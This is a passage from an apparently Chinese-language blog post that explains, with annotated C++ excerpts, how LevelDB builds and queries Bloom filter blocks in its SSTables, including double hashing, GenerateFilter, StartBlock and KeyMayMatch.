&amp;(*dst)[init_size];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;<span class="comment">// 外循环计算每个key，n代表key的个数</span></span><br><span class="line">    <span class="comment">// Use double-hashing to generate a sequence of hash values.</span></span><br><span class="line">    <span class="comment">// See analysis in [Kirsch,Mitzenmacher 2006].</span></span><br><span class="line">    <span class="keyword">uint32_t</span> h = BloomHash(keys[i]);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> delta = (h &gt;&gt; <span class="number">17</span>) | (h &lt;&lt; <span class="number">15</span>);  <span class="comment">// Rotate right 17 bits</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; k_; j++) &#123; <span class="comment">// 内循环计算多个hash</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint32_t</span> bitpos = h % bits;</span><br><span class="line">      <span class="built_in">array</span>[bitpos / <span class="number">8</span>] |= (<span class="number">1</span> &lt;&lt; (bitpos % <span class="number">8</span>));</span><br><span class="line">      h += delta;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得一说的是，在代码末尾计算多个hash时，并不是真的用了多个hash函数（多hash计算浪费计算资源），而是采用了<code>[Kirsch,Mitzenmacher 2006]</code>中的方法，一个hash函数，然后移位的方法来替代多次hash。</p><blockquote><p>Leveldb使用了double hashing来模拟多个hash函数，当然这里不是用来解决冲突的。</p><p>和线性再探测（linearprobing）一样，Double hashing从一个hash值开始，重复向前迭代，直到解决冲突或者搜索完hash表。不同的是，double hashing使用的是另外一个hash函数，而不是固定的步长。</p><p>给定两个独立的hash函数h1和h2，对于hash表T和值k，第i次迭代计算出的位置就是：h(i, k) = (h1(k) + i*h2(k)) mod |T|。</p><p>对此，Leveldb选择的hash函数是：</p><p>Gi(x)=H1(x)+iH2(x)</p><p>H2(x)=(H1(x)&gt;&gt;17) | (H1(x)&lt;&lt;15)</p><p>H1是一个基本的hash函数，H2是由H1循环右移得到的，Gi(x)就是第i次循环得到的hash值。【理论分析可参考论文Kirsch,Mitzenmacher2006】</p></blockquote><blockquote><p>注意，因为sstable中key的个数可能很多，当攒了足够多个key值，就会计算一批位图，再攒一批key，又计算一批位图，那么这么多bloom filter的位图，必需分隔开，否则就混了。</p><p>也就说，位图与位图的边界必需清晰，否则就乱了。</p></blockquote><p>==FilterBlockBuilder::GenerateFilter==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FilterBlockBuilder::GenerateFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> num_keys = start_.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (num_keys == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Fast path if there are no keys for this filter</span></span><br><span class="line">    filter_offsets_.push_back(result_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// tmp_keys中存放本轮要进行计算的keys</span></span><br><span class="line">  <span class="comment">// Make list of keys from flattened key structure</span></span><br><span class="line">  start_.push_back(keys_.<span class="built_in">size</span>());  <span class="comment">// Simplify length computation</span></span><br><span class="line">  tmp_keys_.resize(num_keys);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; num_keys; i++) &#123;</span><br><span class="line">      <span class="comment">// keys_中存放了所有key，通过偏移量start[i]和length (start[i+1] - start[i]) 得到一个key</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* base = keys_.data() + start_[i];</span><br><span class="line">    <span class="keyword">size_t</span> length = start_[i + <span class="number">1</span>] - start_[i];</span><br><span class="line">    tmp_keys_[i] = Slice(base, length);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录上一轮计算的结果</span></span><br><span class="line">  <span class="comment">// Generate filter for current set of keys and append to result_.</span></span><br><span class="line">  filter_offsets_.push_back(result_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="comment">// 计算本轮keys的filter 位图，并将结果放入到result_中</span></span><br><span class="line">  policy_-&gt;CreateFilter(&amp;tmp_keys_[<span class="number">0</span>], <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(num_keys), &amp;result_);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 清空本轮涉及的所有keys</span></span><br><span class="line">  tmp_keys_.<span class="built_in">clear</span>();</span><br><span class="line">  keys_.<span class="built_in">clear</span>();</span><br><span class="line">  start_.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>start_和keys是如何生成的？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FilterBlockBuilder::AddKey</span><span class="params">(<span class="keyword">const</span> Slice&amp; key)</span> </span>&#123;</span><br><span class="line">  Slice k = key;</span><br><span class="line">  start_.push_back(keys_.<span class="built_in">size</span>());<span class="comment">// 记录当前已经存入的keys的size，可以在后面用这些size来分割出每个key的长度</span></span><br><span class="line">  keys_.append(k.data(), k.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数在<code>TableBuilder::Add</code>中被调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Add</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">   xxx</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="comment">// !!</span></span><br><span class="line">    r-&gt;filter_block-&gt;AddKey(key);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  xxx</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> estimated_block_size = r-&gt;data_block.CurrentSizeEstimate();</span><br><span class="line">  <span class="keyword">if</span> (estimated_block_size &gt;= r-&gt;options.block_size) &#123;</span><br><span class="line">    Flush();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">policy_-&gt;CreateFilter(&amp;tmp_keys_[<span class="number">0</span>], <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(num_keys), &amp;result_);</span><br></pre></td></tr></table></figure><p>result_是一个长字节数组（string表示）。里面存放了多论filter位图的计算结果。每次计算都在result_后面apped.</p><h4 id="3-FilterBlockBuilder结构"><a href="#3-FilterBlockBuilder结构" class="headerlink" title="3. FilterBlockBuilder结构"></a>3. FilterBlockBuilder结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A FilterBlockBuilder is used to construct all of the filters for a</span></span><br><span class="line"><span class="comment">// particular Table.  It generates a single string which is stored as</span></span><br><span class="line"><span class="comment">// a special block in the Table.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The sequence of calls to FilterBlockBuilder must match the regexp:</span></span><br><span class="line"><span class="comment">//      (StartBlock AddKey*)* Finish</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterBlockBuilder</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">FilterBlockBuilder</span><span class="params">(<span class="keyword">const</span> FilterPolicy*)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">StartBlock</span><span class="params">(<span class="keyword">uint64_t</span> block_offset)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddKey</span><span class="params">(<span class="keyword">const</span> Slice&amp; key)</span></span>;</span><br><span class="line">  <span class="function">Slice <span class="title">Finish</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GenerateFilter</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> FilterPolicy* policy_;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*注意本轮keys产生的位图计算完毕后，会将keys_, start_ ,还有tmp_keys_ 清空*/</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> keys_;              <span class="comment">// 暂时存放本轮所有keys，追加往后写入</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">size_t</span>&gt; start_;     <span class="comment">// 记录本轮key与key之间的边界的位置，便于分割成多个key</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> result_;            <span class="comment">// 计算出来的位图，多轮计算则往后追加写入</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Slice&gt; tmp_keys_;   <span class="comment">// 将本轮的所有key，存入该vector，其实并无存在的必要，用临时变量即可</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint32_t</span>&gt; filter_offsets_; <span class="comment">//计算出来的多个位图的边界位置，用于分隔多轮keys产生的位图</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// No copying allowed</span></span><br><span class="line">  FilterBlockBuilder(<span class="keyword">const</span> FilterBlockBuilder&amp;);</span><br><span class="line">  <span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> FilterBlockBuilder&amp;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="4-when-amp-how-to-得到filter-和-filter-offset？"><a href="#4-when-amp-how-to-得到filter-和-filter-offset？" class="headerlink" title="4. when &amp; how to 得到filter 和 filter offset？"></a>4. when &amp; how to 得到filter 和 filter offset？</h4><p>==FilterBlockBuilder::StartBlock==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// See doc/table_format.md for an explanation of the filter block format.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate new filter every 2KB of data</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> kFilterBaseLg = <span class="number">11</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> kFilterBase = <span class="number">1</span> &lt;&lt; kFilterBaseLg;</span><br><span class="line"></span><br><span class="line">FilterBlockBuilder::FilterBlockBuilder(<span class="keyword">const</span> FilterPolicy* policy)</span><br><span class="line">    : policy_(policy) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FilterBlockBuilder::StartBlock</span><span class="params">(<span class="keyword">uint64_t</span> block_offset)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> filter_index = (block_offset / kFilterBase);</span><br><span class="line">  assert(filter_index &gt;= filter_offsets_.<span class="built_in">size</span>());</span><br><span class="line">  <span class="keyword">while</span> (filter_index &gt; filter_offsets_.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    GenerateFilter();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码注释上来看，每2kb的data就会生成一个filter。但真的是这样吗？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> filter_index = (block_offset / kFilterBase);<span class="comment">// 计算当前offset所在位置的数据的filter index，入 block_offset=3k,则filter_indx=1</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　filter_offsets_.size() 返回的是当前整个sstable的filter 个数</span><br></pre></td></tr></table></figure><p>所以：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (filter_index &gt; filter_offsets_.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    GenerateFilter();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h5 id="1-how"><a href="#1-how" class="headerlink" title="1. how"></a>1. how</h5><p>假设（注意我说的是假设）GenerateFilter一次处理2kb数据，filter_offsets_.size() 会+1，则上面的代码即将data按照2kb分一个filter来处理。但是实际上==GenerateFilter==的处理方式并不是按2kbf分块处理为，但可确定是，GenerateFilter函数内部，每进行一轮计算，filter_offsets_.size()会+1.</p><p>下面看看GenerateFilter的源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FilterBlockBuilder::GenerateFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 根据前面说所，可推得start_.size()为当前Add进来的key的个数</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> num_keys = start_.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (num_keys == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Fast path if there are no keys for this filter</span></span><br><span class="line">    filter_offsets_.push_back(result_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过start_和key_将 所有添加的key加入到tmp_keys_中。</span></span><br><span class="line">  <span class="comment">// Make list of keys from flattened key structure</span></span><br><span class="line">  start_.push_back(keys_.<span class="built_in">size</span>());  <span class="comment">// Simplify length computation</span></span><br><span class="line">  tmp_keys_.resize(num_keys);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; num_keys; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* base = keys_.data() + start_[i];</span><br><span class="line">    <span class="keyword">size_t</span> length = start_[i + <span class="number">1</span>] - start_[i];</span><br><span class="line">    tmp_keys_[i] = Slice(base, length);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 为所有添加进来的 keys 生成一个 Filter，并将结果 append到 result_中</span></span><br><span class="line">  <span class="comment">// Generate filter for current set of keys and append to result_.</span></span><br><span class="line">  filter_offsets_.push_back(result_.<span class="built_in">size</span>());<span class="comment">// ！filter_offsets_.size() +1</span></span><br><span class="line">  policy_-&gt;CreateFilter(&amp;tmp_keys_[<span class="number">0</span>], <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(num_keys), &amp;result_);</span><br><span class="line"></span><br><span class="line">  tmp_keys_.<span class="built_in">clear</span>();</span><br><span class="line">  keys_.<span class="built_in">clear</span>();</span><br><span class="line">  start_.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取上面的代码，我们可以知道，在一次==GenerateFilter==中，就处理完了之前所有Add进来的keys，此时 filter_offsets_的size只+1，所以</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (filter_index &gt; filter_offsets_.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    GenerateFilter();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个循环，仍在继续。而后序的调用会进入到这个分支：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FilterBlockBuilder::GenerateFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 根据前面说所，可推得start_.size()为当前Add进来的key的个数</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> num_keys = start_.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (num_keys == <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="comment">// 只增加filter_offsets_的size，没有生成新的filter</span></span><br><span class="line">    <span class="comment">// Fast path if there are no keys for this filter</span></span><br><span class="line">    filter_offsets_.push_back(result_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>另外还有没有说的是，filter_offsets_存放的就是各个filter的位置信息（偏移量）。所以除了第一次调用GenerateFilter会生成一个filter，后序的都是空filter。</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>假设当前已经插入的data block大小达到6kb，则GenerateFilter会调用三次。下面给出filter block的图解：</p><p>第一次：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 为所有添加进来的 keys 生成一个 Filter，并将结果 append到 result_中</span></span><br><span class="line"><span class="comment">// Generate filter for current set of keys and append to result_.</span></span><br><span class="line">filter_offsets_.push_back(result_.<span class="built_in">size</span>());<span class="comment">// ！filter_offsets_.size() +1</span></span><br><span class="line">policy_-&gt;CreateFilter(&amp;tmp_keys_[<span class="number">0</span>], <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(num_keys), &amp;result_);</span><br></pre></td></tr></table></figure><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-filter block插入流程1 (1).png" style="zoom: 33%;" /><p>第二次：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (num_keys == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// Fast path if there are no keys for this filter</span></span><br><span class="line">  filter_offsets_.push_back(result_.<span class="built_in">size</span>());<span class="comment">// 此时第一次调用已经使得result_ size增加, 假设这里增加了9</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img data-src="https://pic.downk.cc/item/5f7184db160a154a670fe620.png" style="zoom: 33%;" /><p>第三次：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (num_keys == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// Fast path if there are no keys for this filter</span></span><br><span class="line">  filter_offsets_.push_back(result_.<span class="built_in">size</span>());<span class="comment">// 此时result未发生变化，size依然等于9</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-filter block插入流程3.png" style="zoom:33%;" /><p>这看起来似乎有点奇怪， 注释中说的是一个filter对应2kb的data block, 一个filter offset应该对应一个filter才对，但是这里多个filter offset对应到了一个filter。留个悬念，下面的 <code>KeyMayMatch</code>中会进行讲解。</p><h5 id="2-when"><a href="#2-when" class="headerlink" title="2. when"></a>2. when</h5><p>现在，回到问题，什么时候发起一轮位图计算（即生成一个filter）。</p><p>答案：Flush函数。</p><p>==TableBuilder::Flush==调用==FilterBlockBuilder::StartBlock==:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Flush</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">  assert(!r-&gt;closed);</span><br><span class="line">  <span class="keyword">if</span> (!ok()) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;data_block.empty()) <span class="keyword">return</span>;</span><br><span class="line">  assert(!r-&gt;pending_index_entry);</span><br><span class="line">  WriteBlock(&amp;r-&gt;data_block, &amp;r-&gt;pending_handle);</span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    r-&gt;pending_index_entry = <span class="literal">true</span>;</span><br><span class="line">    r-&gt;status = r-&gt;file-&gt;Flush();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="comment">// !! </span></span><br><span class="line">    r-&gt;filter_block-&gt;StartBlock(r-&gt;offset);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>什么时候Flush?</p><p>当前 data_block超过阈值4kb时。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Add</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> estimated_block_size = r-&gt;data_block.CurrentSizeEstimate();</span><br><span class="line">  <span class="keyword">if</span> (estimated_block_size &gt;= r-&gt;options.block_size) &#123;</span><br><span class="line">    Flush();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-生成filter的调用流程图"><a href="#5-生成filter的调用流程图" class="headerlink" title="5. 生成filter的调用流程图"></a>5. 生成filter的调用流程图</h4><p>![leveldb源码阅读-copy-第 3 页](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LeesrA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第<i class="fa fa-external-link"></i></span> 3 页.png)</p><h4 id="6-KeyMayMatch"><a href="#6-KeyMayMatch" class="headerlink" title="6. KeyMayMatch"></a>6. KeyMayMatch</h4><p>前面说了何时以及如何生成filter和filter offset，有了这两样，我们应该如何使用filter？</p><p><strong>==传入 data_block 的 block_offset==</strong>, 计算给定key是否在这个data block中。</p><p>传入 data_block 的 block_offset</p><p>传入 data_block 的 block_offset。</p><p>重要的事情说3遍。<strong>传入的的参数是一个block的起始offset，而不是一个key所在data block的offset。</strong></p><p>先看代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FilterBlockReader::KeyMayMatch</span><span class="params">(<span class="keyword">uint64_t</span> block_offset, <span class="keyword">const</span> Slice&amp; key)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> index = block_offset &gt;&gt; base_lg_;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; num_) &#123;</span><br><span class="line">      <span class="comment">// 启始偏移</span></span><br><span class="line">    <span class="keyword">uint32_t</span> start = DecodeFixed32(offset_ + index * <span class="number">4</span>);</span><br><span class="line">     <span class="comment">// 结尾偏移量</span></span><br><span class="line">    <span class="keyword">uint32_t</span> limit = DecodeFixed32(offset_ + index * <span class="number">4</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (start &lt;= limit &amp;&amp; limit &lt;= <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(offset_ - data_)) &#123;<span class="comment">// 考虑一下，什么时候start会=limit</span></span><br><span class="line">        <span class="comment">// 得到filter</span></span><br><span class="line">      Slice filter = Slice(data_ + start, limit - start);</span><br><span class="line">        <span class="comment">// 正式匹配</span></span><br><span class="line">      <span class="keyword">return</span> policy_-&gt;KeyMayMatch(key, filter);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (start == limit) &#123;</span><br><span class="line">      <span class="comment">// Empty filters do not match any keys</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// Errors are treated as potential matches</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看 return policy_-&gt;KeyMayMatch(key, filter);</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">KeyMayMatch</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; bloom_filter)</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> len = bloom_filter.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span 